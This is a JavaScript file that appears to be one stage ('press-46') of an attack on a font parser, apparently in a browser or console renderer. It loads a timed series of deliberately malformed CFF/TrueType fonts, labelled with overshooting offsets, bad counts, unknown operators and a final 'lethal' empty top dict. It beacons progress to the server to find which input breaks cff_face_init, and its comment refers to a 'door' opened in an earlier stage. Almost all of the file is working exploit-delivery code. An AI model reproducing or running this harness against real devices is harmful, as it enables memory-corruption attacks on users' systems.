/* press-46 EXTERNO — CFF DEPTH: DICT/INDEX lies al cff_face_init (puerta ya abierta en press-45). f32 (sin CharStrings op) LETAL-ÚLTIMA. */
(function(){
"use strict";
if(window.__p46)return; window.__p46=1;
var RID="v46x"+Date.now().toString(36).slice(-13);
function bk(s,b){try{fetch("/beacon/"+s,{method:"POST",cache:"no-store",keepalive:true,headers:{"Content-Type":"application/json"},body:JSON.stringify({r:RID,b:String(b).slice(0,500)})}).catch(function(){});}catch(e){}}
var HB=setInterval(function(){bk("V46-HB","hb");},2000);
var dr="-",rt="-";
try{dr=typeof window.deriveRuntime;rt=(dr==="object"&&window.deriveRuntime)?typeof window.deriveRuntime.run:"-";}catch(e){}
bk("V46-L","press46-EXT CFF-depth; dr="+dr+"; rt="+rt);
function Trnd(){return Date.now().toString(36)+Math.floor(Math.random()*1e4).toString(36);}
var done={};
function doLoad(id,f,label){
  if(done[id])return;done[id]=1;
  bk("V46-E"+id,"enter-load "+id+" ("+f+") "+label);
  try{
    var ff=new FontFace("v46-"+id,"url(/document/al/ps5/"+f+"?t="+Trnd()+")");
    document.fonts.add(ff);
    ff.load().then(function(){bk("V46-R"+id,id+" load=OK status="+ff.status);},
                    function(err){bk("V46-R"+id,id+" rechaza:"+String((err&&err.name)+" "+((err&&err.message)||"")).slice(0,70));});
  }catch(e){bk("V46-R"+id,id+" E:"+String((e&&e.message)||e).slice(0,50));}
}
setTimeout(function(){doLoad("d24","f24.ttf","op17->0x2000 beyond");},300);
setTimeout(function(){doLoad("d25","f25.ttf","CS count=0xFFFF");},1300);
setTimeout(function(){doLoad("d26","f26.ttf","CS off2=0xF0 overshoot");},2300);
setTimeout(function(){doLoad("d27","f27.ttf","dangling operand no-op");},3300);
setTimeout(function(){doLoad("d28","f28.ttf","Private size15 off0x2100");},4300);
setTimeout(function(){doLoad("d29","f29.ttf","CFF major=2");},5300);
setTimeout(function(){doLoad("d30","f30.ttf","unknown op 12-27");},6300);
setTimeout(function(){doLoad("d31","f31.ttf","dup op17");},7300);
setTimeout(function(){bk("V46-Z","pre-lethal");},8500);
setTimeout(function(){doLoad("d32","f32.ttf","EMPTY topdict no-CharStrings-op");},9000);  /* LETHAL-LAST */
setTimeout(function(){clearInterval(HB);bk("V46-Z2","late-z");},14000);
})();
